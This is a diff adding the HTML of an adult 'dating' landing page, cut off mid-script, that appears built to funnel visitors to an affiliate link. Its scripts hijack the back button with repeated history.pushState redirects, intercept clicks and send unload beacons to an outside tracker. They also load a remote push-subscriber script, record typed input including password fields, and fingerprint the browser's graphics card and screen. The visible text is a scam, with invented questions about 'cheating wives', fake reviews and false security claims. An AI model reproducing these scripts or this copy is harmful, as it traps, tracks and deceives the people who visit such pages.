@@ -1,0 +1,665 @@
+
+<!DOCTYPE HTML><html lang="en-US"><head><meta charset="UTF-8"><base href="https://cdn-dimi.akamaized.net"><script>let imiFinButCbs = [];
+    let imiFinButCbsCntr = 0;
+    let callImiFinBut = false;
+    
+    function imiFinButClickSubscribe(callback) {
+      if (typeof callback === "function") {
+        imiFinButCbs.push(callback);
+        imiFinButCbsCntr += 1;
+      }
+    }
+    
+    function imiFinButSubscriberDone(evt, target) {
+      imiFinButCbsCntr -= 1;
+      if (imiFinButCbsCntr <=0 ) {
+        if (!callImiFinBut) {
+          callImiFinBut = true;
+          target.dispatchEvent(evt);
+        }
+      }
+    }
+    
+    document.addEventListener("DOMContentLoaded", function (){
+      let btns = document.getElementsByTagName("a");
+      let lI = -1;
+      for (let i=0; i<btns.length; i++) {
+        if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1 && btns[i].getAttribute("href") === "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=") {
+          lI = i;
+        } else if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1) {
+          lI = i;
+        } else if (btns[i].getAttribute("href") === "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=") {
+          lI = i;
+        }
+      }
+      if (lI > -1) {
+        function imiFinButClick(ev) {
+          if (imiFinButCbs.length > 0) {
+            let oev = new ev.constructor(ev.type, ev);
+            let trgt = ev.target;
+            ev.preventDefault();
+            ev.stopImmediatePropagation();
+            trgt.removeEventListener("click", imiFinButClick);
+            for (let i = 0; i < imiFinButCbs.length; i++) {
+              imiFinButCbs[i](oev, trgt, imiFinButSubscriberDone);
+            }
+            setTimeout(function () {
+              if (!callImiFinBut) {
+                   callImiFinBut = true;
+                   trgt.dispatchEvent(oev);
+              }
+            }, 1000);
+          }
+        }
+    
+        btns[lI].addEventListener("click", imiFinButClick);
+      }
+    });
+    </script><script>let imiBBQ = [];
+    
+    function imiBBQAdd(callback, params) {
+        if (typeof callback === "function") {
+            imiBBQ.push({fnc: callback, p: params});
+        }
+    }
+    
+    function imiBB() {
+        if (typeof ortbConf !== "undefined" && ortbConf !== null && typeof ortbConf === "object") {
+            if (ortbConf.hasOwnProperty("force_bub") && ortbConf.force_bub === 1) {
+                return false;
+            }
+        }
+        const sv = {
+            'df86699f6130e141': '', '2148702d7c2782df': '', '0f53c12c292fff5b': ''
+        };
+        let hash = window.location.pathname.replace('/c/', '');
+        let url = window.location.protocol + '//' + window.location.host + window.location.pathname;
+    
+        if (hash.length === 0) {
+            hash = location.search.replace(/.*utm_source=([^&]*).*|(.*)/, '$1');
+        }
+    
+        if (hash && hash.length > 1 && sv[hash]) {
+            url = window.location.protocol + '//' + window.location.host + window.location.pathname.replace('/c/' + hash, '/c/' + sv[hash]);
+        }
+        let curHref = window.location.href;
+        let lQuery = window.location.search.replace("?", "").split('&');
+        let nQuery = "s1=50244&s2=1850758&s3=&s5=backuser&click_id=&iexpp=1&j1=1".split('&');
+    
+        let nQueryKeys = [];
+        for (let j=0;j<nQuery.length;j++) {
+            nQueryKeys.push(nQuery[j].split('=')[0]);
+        }
+    
+        for (let j=0;j<lQuery.length;j++) {
+            let tmp = lQuery[j].split('=');
+            if (nQueryKeys.indexOf(tmp[0]) === -1) {
+                nQuery.push(tmp[0] + "=" + tmp[1]);
+            }
+        }
+    
+        url = url + '?' + nQuery.join("&");
+        try {
+            history.pushState({}, '', url);
+            history.pushState({}, '', url);
+    
+            window.onpopstate = function (ev) {
+                if (ev['state']) {
+                    window.exit = curHref.indexOf('&iexpp=1') !== -1;
+                    if (imiBBQ.length > 0) {
+                        let clb = imiBBQ.pop();
+                        clb['fnc'].apply(null, clb['p']);
+                    } else {
+                        location.replace(url);
+                    }
+                }
+            };
+        } catch (ex) {}
+    }
+    
+    !function () {
+        let touched = false;
+        let chromeVersion = 0;
+        try {
+            chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
+        } catch (e) {
+            chromeVersion = 0;
+        }
+        if (chromeVersion >= 75) {
+            window.addEventListener('mouseup', function () {
+                    if (!touched) {
+                        touched = true;
+                        setTimeout(function () {
+                                imiBB();
+                            }
+                            , 0);
+                    }
+                }
+            );
+            document.addEventListener("DOMContentLoaded", function () {
+                    document.body.addEventListener('touchend', function (evt) {
+                            if (!touched) {
+                                touched = true;
+                                setTimeout(function () {
+                                        imiBB();
+                                    }
+                                    , 0);
+                            }
+                        }
+                    );
+                    document.body.addEventListener('keydown', function () {
+                            if (!touched) {
+                                touched = true;
+                                setTimeout(function () {
+                                        imiBB();
+                                    }
+                                    , 0);
+                            }
+                        }
+                    );
+                }
+            );
+        } else {
+            setTimeout(function () {
+                    imiBB();
+                }
+                , 0);
+        }
+    }
+    ();
+    </script><script>var pushFinalClick = false;
+    var apcid = "211";
+    var _push = {serverUrl:"https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=",urlParams:{sub:"",s1:"50244",s2:"1850758",cid:apcid, tid:"qzxkd64746c2500056959"},sCb: function (s) {
+            window.addEventListener('unload', function (e) {
+                if (pushFinalClick === false) {
+                    var url = "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=";
+                    if (url.indexOf("?") !== -1) {
+                        url = url + "&pushclick=1";
+                    } else {
+                        url = url + "?pushclick=1";
+                    }
+    
+                    if ("function" === typeof navigator.sendBeacon) {
+                        navigator.sendBeacon(url);
+                    } else {
+                        var xhr = new XMLHttpRequest();
+                        if ("withCredentials" in xhr) {
+                            xhr.open("GET", url);
+                            xhr.send();
+                        } else if ("undefined" != typeof XDomainRequest) {
+                            xhr = new XDomainRequest();
+                            xhr.open("GET", url);
+                            xhr.send();
+                        }
+                    }
+                }
+            });
+        }};
+    document.addEventListener("DOMContentLoaded", function () {
+        let stopPush = false;
+        if (typeof pushConf !== "undefined" && pushConf !== null && typeof pushConf === "object") {
+            if (pushConf.hasOwnProperty("cid") && pushConf.cid !== "") {
+                apcid = pushConf.cid;
+            }
+            if (pushConf.hasOwnProperty("stop_push") && pushConf.stop_push === 1) {
+                stopPush = true;
+            }
+        }
+        if (typeof manpcid !== 'undefined' && manpcid !== "" && manpcid !== 0) {
+            apcid = manpcid;
+        }
+        _push.urlParams.cid = apcid;
+        if (stopPush === false) {
+            (function (p, u, s, h) {
+                p._pcq = p._pcq || [];
+                p._pcq.push(['_currentTime', Date.now()]);
+                s = u.createElement('script');
+                s.type = 'text/javascript';
+                s.async = true;
+                s.src = _push.serverUrl + '/js/pushjs/1.0.0/subscriber.js';
+                h = u.getElementsByTagName('script')[0];
+                h.parentNode.insertBefore(s, h);
+            })(window, document);
+    
+            function updateIsFinalClick(evt, trgt, callback) {
+                if ("a" === trgt.tagName.toLowerCase() && "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" === trgt.href)  {
+                    pushFinalClick = true;
+                }
+                callback(evt, trgt);
+            }
+    
+            document.addEventListener("click", function (e){
+                if ("a" === e.target.tagName.toLowerCase() && "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" === e.target.href)  {
+                    pushFinalClick = true;
+                }
+            });
+        }
+    });
+    </script><script>let imiRTBTouched = false;
+    let imiBUBURL = "";
+    
+    function imiRTBTrackClick() {
+        let url = "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=";
+        if (url.indexOf("?") !== -1) {
+            url = url + "&ortbclick=1";
+        } else {
+            url = url + "?ortbclick=1";
+        }
+    
+        if (typeof navigator.sendBeacon === "function") {
+            navigator.sendBeacon(url);
+        } else {
+            let xhr = new XMLHttpRequest();
+            if ("withCredentials" in xhr) {
+                xhr.open("GET", url);
+                xhr.send();
+            } else if (typeof XDomainRequest != "undefined") {
+                xhr = new XDomainRequest();
+                xhr.open("GET", url);
+                xhr.send();
+            }
+        }
+    }
+    
+    function imiRTBTrackReplace(url) {
+        url = url.replace('[s1]', '50244');
+        url = url.replace('[s2]', '1850758');
+        return url.replace('[tid]', 'qzxkd64746c2500056959');
+    }
+    
+    function imiRTBBUBCall(url, wrpId) {
+        $(wrpId).remove();
+        location.replace(url);
+    }
+    
+    function imiRTBBUB(url, wrpId, fBUB) {
+        if (url !== "") {
+            imiRTBTouched = true;
+            let rUrl = "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=";
+            let op = rUrl.indexOf('?') === -1 ? '?' : '&';
+            rUrl = rUrl + op + "url=" + window.btoa(url) + "&ortbbub=1";
+            if (typeof imiBBQAdd === 'function' && fBUB === false) {
+                imiBBQAdd(imiRTBBUBCall, [rUrl, wrpId]);
+            } else {
+                try {
+                    history.pushState({}, '', rUrl);
+                    history.pushState({}, '', rUrl);
+    
+                    window.onpopstate = function (ev) {
+                        if (ev['state']) {
+                            imiRTBBUBCall(rUrl, wrpId);
+                        }
+                    };
+                } catch (ex) {}
+            }
+        }
+    }
+    
+    function imiRTBHandle(target, wrpId, fBtn, bub, fBUB) {
+        if (target.length > 1 && fBtn !== false) {
+            let url = imiRTBTrackReplace(target);
+            imiBUBURL = url;
+            if (bub === 0) {
+                $(fBtn).attr('href', url);
+                $(fBtn).on('click', function (ev) {
+                    ev.preventDefault();
+                    ev.stopImmediatePropagation();
+                    $(wrpId).remove();
+                    imiRTBTrackClick();
+                    location.href = url;
+                });
+            } else {
+                imiRTBBUB(imiBUBURL, wrpId, fBUB);
+            }
+        } else {
+            $(wrpId).remove();
+        }
+    }
+    
+    function imiRTBCall() {
+        const wrpId = "#wrp-id";
+        let mbu = 0;
+        let bub = 0;
+        let mdl = "";
+        let skipBu = 0;
+        let bu = "_b";
+        let feed = "";
+        let feedBU = "";
+        let feedBUB = "";
+        let dblReq = 0;
+        let fBUB = false;
+        let mdlBU = "";
+        let mdlBUB = "";
+    
+        if (typeof ortbConf !== "undefined" && ortbConf !== null && typeof ortbConf === "object") {
+            if (ortbConf.hasOwnProperty("bu") && ortbConf.bu === 1) {
+                mbu = 1;
+            }
+            if (ortbConf.hasOwnProperty("bub") && ortbConf.bub === 1) {
+                bub = 1;
+                mbu = 1;
+            }
+            if (ortbConf.hasOwnProperty("model") && ortbConf.model !== "") {
+                mdl = ortbConf.model;
+            }
+            if (ortbConf.hasOwnProperty("skip_bu") && ortbConf.skip_bu === 1) {
+                skipBu = 1;
+            }
+            if (ortbConf.hasOwnProperty("feed") && ortbConf.feed !== "") {
+                feed = ortbConf.feed;
+            }
+            if (ortbConf.hasOwnProperty("feed_bu") && ortbConf.feed_bu !== "") {
+                feedBU = ortbConf.feed_bu;
+            }
+            if (ortbConf.hasOwnProperty("feed_bub") && ortbConf.feed_bub !== "") {
+                feedBUB = ortbConf.feed_bub;
+            }
+            if (ortbConf.hasOwnProperty("main_and_bub") && ortbConf.main_and_bub !== "" && skipBu === 0) {
+                if (bu === "") {
+                    dblReq = ortbConf.main_and_bub;
+                }
+                bub = 1;
+                mbu = 0;
+            }
+            if (ortbConf.hasOwnProperty("force_bub") && ortbConf.force_bub === 1) {
+                fBUB = true;
+            }
+            if (ortbConf.hasOwnProperty("model_bu") && ortbConf.model_bu !== "") {
+                mdlBU = ortbConf.model_bu;
+            }
+            if (ortbConf.hasOwnProperty("model_bub") && ortbConf.model_bub !== "") {
+                mdlBUB = ortbConf.model_bub;
+            }
+        }
+    
+        if ($(wrpId).length && (skipBu === 0 || (skipBu === 1 && bu === ""))) {
+            let fBtn = false;
+            let btns = document.getElementsByTagName("a");
+            let lI = -1;
+            for (let i=0; i<btns.length; i++) {
+                if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1 && btns[i].getAttribute("href") === "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=") {
+                    lI = i;
+                } else if (btns[i].getAttribute("class") !== null && btns[i].getAttribute("class").indexOf("btn-fin") !== -1) {
+                    lI = i;
+                } else if (btns[i].getAttribute("href") === "https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=") {
+                    lI = i;
+                }
+            }
+            if (lI > -1) {
+                fBtn = btns[lI];
+            }
+    
+            if (bub) {
+                let chromeVersion = 0;
+                try {
+                    chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
+                } catch (e) {
+                }
+    
+                if (chromeVersion >= 75) {
+                    window.addEventListener('mouseup', function () {
+                        if (imiRTBTouched !== true) {
+                            setTimeout(function () {
+                                imiRTBBUB(imiBUBURL, wrpId, fBUB);
+                            }, 0);
+                        }
+                    });
+                    document.body.addEventListener('touchend', function () {
+                        if (imiRTBTouched !== true) {
+                            setTimeout(function () {
+                                imiRTBBUB(imiBUBURL, wrpId, fBUB);
+                            }, 0);
+                        }
+                    });
+                    document.body.addEventListener('keydown', function () {
+                        if (imiRTBTouched !== true) {
+                            setTimeout(function () {
+                                imiRTBBUB(imiBUBURL, wrpId, fBUB);
+                            }, 0);
+                        }
+                    });
+                } else {
+                    imiRTBTouched = true;
+                }
+            }
+            let s1s2 = "50244_1850758";
+            if (mbu === 1) {
+              s1s2 = s1s2 + "_b";
+            } else {
+              s1s2 = s1s2 + bu;
+            }
+            $.ajax({
+                url: window.location.protocol + '//' + window.location.host + '/ortb',
+                dataType: "json",
+                type: "POST",
+                data: {
+                    "vid"    : "qzxkd64746c2500056959",
+                    "s1s2"   : s1s2,
+                    "s1"     : "50244",
+                    "s2"     : "1850758",
+                    "ip"     : "42.0.7.225",
+                    "ua"     : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+                    "dt"     : "DESKTOP",
+                    "mk"     : "Google",
+                    "ml"     : "Desktop",
+                    "os"     : "Windows",
+                    "osv"    : "10",
+                    "cn"     : "Wired",
+                    "tt"     : "1",
+                    "ctr"    : "bgd",
+                    "lang"   : "en",
+                    "bu"     : mbu === 1 ? "_b" : bu,
+                    "osid"   : "192",
+                    "hid"    : "49415",
+                    "mdl"    : mdl,
+                    "fd"     : feed,
+                    "fdbu"   : feedBU,
+                    "fdbub"  : feedBUB,
+                    "bub"    : bub === 1 ? "1" : "",
+                    "dbl"    : dblReq === 1 ? "1" : "",
+                    "mdlbu"  : mdlBU,
+                    "mdlbub" : mdlBUB
+                },
+                success: function (result) {
+                    if (result !== undefined) {
+                        if  (dblReq === 0 && result[0].target !== undefined && result[0].target !== "") {
+                            imiRTBHandle(result[0].target, wrpId, fBtn, bub, fBUB);
+                        } else if (dblReq === 1) {
+                            let rmBtn = true;
+                            if (result[0].target !== undefined && result[0].target !== "") {
+                                rmBtn = false;
+                                imiRTBHandle(result[0].target, wrpId, fBtn, 0, fBUB);
+                            }
+                            if (result[1].target !== undefined && result[1].target !== "") {
+                                rmBtn = false;
+                                imiRTBHandle(result[1].target, wrpId, fBtn, 1, fBUB);
+                            }
+                            if (rmBtn) {
+                                $(wrpId).remove();
+                            }
+                        } else {
+                            $(wrpId).remove();
+                        }
+                    } else {
+                        $(wrpId).remove();
+                    }
+                },
+                error: function () {
+                    $(wrpId).remove();
+                }
+            });
+        }
+    }
+    
+    document.addEventListener("DOMContentLoaded", imiRTBCall);
+    </script><script>var _rup = {
+        's': 'https',
+        'h': 'emojk.datlngllfe.net',
+        'p': '/site/redirectpage',
+        'q': 'https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id='
+    };</script><title>Best Dating Site</title><meta name="viewport" content="user-scalable=false, initial-scale=1.0, maximum-scale=1.0">
+    
+            <link href="https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" rel="icon" type="image/x-icon" /><link rel="apple-touch-icon" sizes="180x180" href="/landings/277096/1674892629/images/favicon.png?t=20230529091101"><link rel="icon" type="image/png" href="/landings/277096/1674892629/images/favicon.png?t=20230529091101" sizes="32x32"><link rel="icon" type="image/png" href="/landings/277096/1674892629/images/favicon.png?t=20230529091101" sizes="16x16"><link rel="manifest" href="/landings/277096/1674892629/manifest.json?t=20230529091101"><meta name="theme-color" content="#ffffff"><meta name="msapplication-config" content="/landings/277096/1674892629/browserconfig.xml?t=20230529091101" />
+            <meta content="" name="keywords"><meta content="" name="description"><link rel="stylesheet" type="text/css" href="/landings/277096/1674892629/css/popup.css?1674892629"><link rel="stylesheet" type="text/css" href="/landings/277096/1674892629/css/style.css?1674892629"><link rel="stylesheet" type="text/css" href="/landings/277096/1674892629/css/reviews.css?1674892629"><link rel="stylesheet" type="text/css" href="/landings/277096/1674892629/css/timer.css?1674892629"><script type="text/javascript" src="/landings/277096/1674892629/js/jquery-2.2.4.min.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/jquery.validate.min.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/translates.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/translates-review.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/title_tanslate.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/timer.js?1674892629"></script><script type="text/javascript" src="/landings/277096/1674892629/js/translate-popup-timer.js?1674892629"></script></head><body  style="" ><script>
+      var _rup = {
+      's': '', 'h': '', 'p': '', 'q': ''    };
+    </script><script>
+      var formData = {
+      };
+    </script><div style="display: none;"><img src="https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" alt=""></div><!--<div class="pop-up--timer"><div class="popUp--block"><div class="countdown-title countdownTitle">Увага!        </div><div class="countdown-message countdownMessage">Безкоштовна реєстрація закінчиться через:        </div><div class="timer-wrapper"><div class="timer-section"><div id="min-dozens" class="timer">0                </div><div id="min-unity" class="timer">6                </div></div>:            <div class="timer-section"><div id="sec-dozens" class="timer">4                </div><div id="sec-unity" class="timer">9                </div></div></div><button class="btn btn--primary js-pop-button-close text05">ОК        </button></div></div> --><div class="main"><div class="header"><div class="header-inner"><div class="header-logo"><img src="/landings/277096/1674892629/images/logo_inst3.svg" alt=""></div><div class="header-nav"><span class="icon icon-home"></span><span class="icon icon-search"></span><span class="icon icon-plus"></span><span class="icon icon-like"></span><span class="icon icon-user"></span></div></div></div><div class="stepbox"><!--  <div class="timer-wrapper"><div class="timer-section"><div id="min-dozens-1" class="timer">0                </div><div id="min-unity-1" class="timer">0                </div></div>:            <div class="timer-section"><div id="sec-dozens-1" class="timer">0                </div><div id="sec-unity-1" class="timer">0                </div></div></div><div class="position"><span class="pos_girls-found"><span class="num-girls">126                </span><span class="text35">girls found                </span></span><span class="pos_city"><img src="/landings/277096/1674892629/images/icon-city.svg" alt=""><span class="text36">IN                </span>shibpur            </span></div>--><div class="step step-0 current"><div class="step__inner"><div class="step__header"></div><div class="step__body"><p class="gender-q">
+                Select your gender                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a href="https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" class="btn btn--accent go-to-age btn-no gender-a1" onclick="formData.gender='woman'">
+                  I am a woman                                                
+                </a><a href="https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=" class="btn btn--accent btn--primary next btn-yes gender-a2" onclick="formData.gender='man'">
+                  I am a man                                                
+                </a></div></div></div><!--  <div class="safety-block"><ul><li><img src="/landings/277096/1674892629/images/unlock.svg" alt=""><h4 class="sb-title-1 sbTitle1">Secure                        </h4><p class="sb-text-1 sbText1">We use 256 bit Encription                        </p></li><li><img src="/landings/277096/1674892629/images/shield.svg" alt=""><h4 class="sb-title-2 sbTitle2">Private                        </h4><p class="sb-text-2 sbText2">Your Privacy is Guaranteed                        </p></li><li><img src="/landings/277096/1674892629/images/password.svg" alt=""><h4 class="sb-title-3 sbTitle3">Safe                        </h4><p class="sb-text-3 sbText3">100% Safe, Private and Secure                        </p></li></ul></div>--></div><div class="step step-1"><div class="step__inner"><div class="step__header"><h1>
+                WARNING!                                        
+              </h1></div><div class="step__body"><p>
+                You will see nude photos. Please be discreet.                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a class="btn btn--primary next btn-next" href="javascript:void(0)">
+                  Next                                                
+                </a></div></div></div></div><div class="step step-2"><div class="step__inner"><div class="step__header"><h6>
+                question 1                                        
+              </h6></div><div class="step__body"><p>
+                Many of these women are desperate single moms and cheating wives looking for some fun. They could be your neighbors or someone you know.                        Do you agree to keep the identity of these women a secret?                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a class="btn btn--accent  slick-next btn-no next" href="javascript:void(0)">
+                  no                                                
+                </a><a class="btn btn--primary  next btn-yes" href="javascript:void(0)">
+                  yes                                                
+                </a></div></div></div></div><div class="step step-3"><div class="step__inner"><div class="step__header"><h6>
+                question 2                                        
+              </h6></div><div class="step__body"><p>
+                These women have asked us to not allow men that are seeking a &quot;relationship&quot;. They only desire quick sex. Not dating. Do you                        agree to this request?                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a class="btn btn--accent  slick-next btn-no next" href="javascript:void(0)">
+                  no                                                
+                </a><a class="btn btn--primary  next btn-yes" href="javascript:void(0)">
+                  yes                                                
+                </a></div></div></div></div><div class="step step-4 step-age"><div class="step__inner"><div class="step__header"><h6>
+                question 3                                        
+              </h6></div><div class="step__body"><p class="age-q">
+                What is your age?                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a href="javascript:void(0)" class="btn btn--primary next btn--accent" onclick="formData.age='18-25'">
+                  18-25                                                
+                </a><a href="javascript:void(0)" class="btn btn--primary next btn--accent" onclick="formData.age='25-35'">
+                  25-35                                                
+                </a><a href="javascript:void(0)" class="btn btn--primary next btn--accent" onclick="formData.age='35-45'">
+                  35-45                                                
+                </a><a href="javascript:void(0)" class="btn btn--primary next btn--accent" onclick="formData.age='45+'">
+                  45+                                                
+                </a></div></div></div></div><div class="step step-9"><div class="step__inner"><div class="step__header"><h1>
+                thank you!                                        
+              </h1></div><div class="step__body"><p>
+                You may now see our list and photos of women who are in your area. Again, please keep their identity a secret. Click on the                        &quot;Continue&quot; button and search on the basis of your answers.                                        
+              </p></div><div class="step__footer"><div class="btnbox"><a class="btn btn--primary btn-fin btn-continue btn-fin redirect-url-button" href="https://utopicmobile.com/show.php?l=0&u=212166&id=47712&tracking_id=">               Continue                                                             </a></div></div></div><!--<div class="safety-block"><ul><li><img src="/landings/277096/1674892629/images/unlock.svg" alt=""><h4 class="sb-title-1 sbTitle1">              Secure                                    </h4><p class="sb-text-1 sbText1">              We use 256 bit Encription                                    </p></li><li><img src="/landings/277096/1674892629/images/shield.svg" alt=""><h4 class="sb-title-2 sbTitle2">              Private                                    </h4><p class="sb-text-2 sbText2">              Your Privacy is Guaranteed                                    </p></li><li><img src="/landings/277096/1674892629/images/password.svg" alt=""><h4 class="sb-title-3 sbTitle3">              Safe                                    </h4><p class="sb-text-3 sbText3">              100% Safe, Private and Secure                                    </p></li></ul></div>--></div></div><!--<div class="comments_list"><div class="comments_list_icons"><span class="like_wrap"><span class="icon-like2"><img src="/landings/277096/1674892629/images/icon-like2.svg" alt=""></span><span class="icon-message"><img src="/landings/277096/1674892629/images/icon-message.svg" alt=""></span><span class="icon-direct"><img src="/landings/277096/1674892629/images/icon-direct.svg" alt=""></span></span><span class="comments_list_icons_item item_views"><span class="icon-flag"><img src="/landings/277096/1674892629/images/icon-flag.svg" alt=""></span></span></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava1" src="/landings/277096/1674892629/images/1-eu.png"></div><div class="reviews"><div class="comment_name commentName1">Albert_69                </div><div class="comment_text commentText1">Cool site! I recommend it to everyone!                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava2" src="/landings/277096/1674892629/images/2-eu.png"></div><div class="reviews"><div class="comment_name commentName2">Lucky                </div><div class="comment_text commentText2">For those who are tired of Tinder. Everything is much easier and cooler.                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava3" src="/landings/277096/1674892629/images/3-eu.png"></div><div class="reviews"><div class="comment_name commentName3">Anonymous                </div><div class="comment_text commentText3">I registered yesterday, the main thing is that my husband doesn't find out!                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava4" src="/landings/277096/1674892629/images/4-eu.png"></div><div class="reviews"><div class="comment_name commentName4">Alex                </div><div class="comment_text commentText4">The link was given by a friend, it's just top! There's no easier way to find someone!                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava5" src="/landings/277096/1674892629/images/5-eu.png"></div><div class="reviews"><div class="comment_name commentName5">Stasy_777                </div><div class="comment_text commentText5">After my divorce I am not looking for a serious relationship. This site is just perfect for me.                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava6" src="/landings/277096/1674892629/images/6-eu.png"></div><div class="reviews"><div class="comment_name commentName6">Kiddo                </div><div class="comment_text commentText6">Didn't even know there were so many beautiful ladies in my area who text firs                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava7" src="/landings/277096/1674892629/images/7-eu.png"></div><div class="reviews"><div class="comment_name commentName7">Ian_19                </div><div class="comment_text commentText7">Always wanted to find a mature hot mom. Anonymity guaranteed!                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div><div class="comments_list_row"><div class="photo_avatar"><img class="ava8" src="/landings/277096/1674892629/images/8-eu.png"></div><div class="reviews"><div class="comment_name commentName8">Bro                </div><div class="comment_text commentText8">If you do not want to waste time on romance and other nonsense - this site is for you!                </div><div class="comments_list_btns"><span class="comments_list_btn"><i class="custom-icon custom-icon-comment"></i><span class="commentWord">Comment                        </span></span></div><div class="icon-reaction reaction-like"></div></div></div></div>--></div><div class="progress"><div class="bar"></div></div><div class="videobgbox"><video class="video" loop autoplay muted playsinline=""><source src="/landings/277096/1674892629/images/4.mp4" type="video/mp4"></video></div><div id="wrp-id"></div><script>
+      var ortbConf = {
+      feed: 3156, "feed_bub": 3166,"main_and_bub": 1, "model": "ecpm", "model_bub": "epm"};
+    </script><img id="path" class="img-path" style="display: none;" src="/landings/277096/1674892629/images/blocked-icon.png"><script>
+      let stepDataReady = 0, stepData = {
+      country: 'Bangladesh', sexual_orientation: 'hetero'    }
+      , genderArr = {
+      man: 'male', woman: 'female'        };
+      $(".step .btn--accent").on("click", function (event) {
+        if (!stepDataReady && formData && Object.keys(formData).length > 0) {
+          if (Object.keys(formData).includes('age') && Object.keys(formData).includes('gender') && Object.keys(genderArr).includes(formData.gender)) {
+            stepData['gender'] = genderArr[formData.gender];
+            let agePeriod = formData.age;
+            if (agePeriod.includes('+')) {
+              agePeriod = agePeriod.replace('+', '-70')                }
+            let arr = agePeriod.split('-');
+            stepData['age'] = Math.floor(Math.random() * (Number(arr[1]) - Number(arr[0]) + 1)) + Number(arr[0]);
+            var value = window.btoa(JSON.stringify(stepData));
+            let button = $('.redirect-url-button');
+            let url = button.attr('href');
+            url += '&_stepData=' + value;
+            button.attr('href', url);
+            stepDataReady = 1;
+          }
+        }
+      }
+                                 );
+    </script><script>
+      $(document).ready(function () {
+        var trackInputTime = {
+        };
+        $('input[type=\'text\'],input[type=\'email\'],input[type=\'password\']').on('keydown', function (e) {
+          var name = $(this).attr('name');
+          if (name && name.length > 0 && !trackInputTime.hasOwnProperty(name)) {
+            trackInputTime[name] = {
+            start: new Date(), end: new Date()                }
+          }
+        }
+                                                                                    );
+        $('input[type=\'text\'],input[type=\'email\'],input[type=\'password\']').on('keyup', function (e) {
+          var name = $(this).attr('name');
+          if (name && name.length > 0 && trackInputTime.hasOwnProperty(name)) {
+            trackInputTime[name].end = new Date();
+            formData[name] = $(this).val();
+          }
+        }
+                                                                                    );
+        function getVideoCardInfo() {
+          const gl = document.createElement('canvas').getContext('webgl');
+          if (!gl) {
+            return {
+            v_error: "no webgl",                };
+          }
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            return {
+            v_vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL), v_renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),                };
+          }
+          return {
+          v_error: "no WEBGL_debug_renderer_info",            };
+        }
+        function getResolutionInfo() {
+          return {
+          'heightScreen': window.screen.availHeight, 'widthScreen': window.screen.availWidth,            }
+        }
+        function getAdditionalInfo(formDataUpdate) {
+          let resolutionData = getResolutionInfo();
+          let cardData = getVideoCardInfo();
+          formDataUpdate['ua'] = navigator.userAgent;
+          Object.assign(formDataUpdate, resolutionData, cardData);
+          return formDataUpdate;
+        }
+        function processLangen(event, target, callback) {
+          $('a.btn-fin').attr('disabled', true);
+          formData['lang'] = 'English';
+          formData['country'] = 'Bangladesh';
+          formData['city'] = "shibpur";
+          formData['state'] = "dhaka";
+          formData['device_type'] = 'DESKTOP';
+          formData['is_unique'] = '0';
+          formData['s3'] = '';
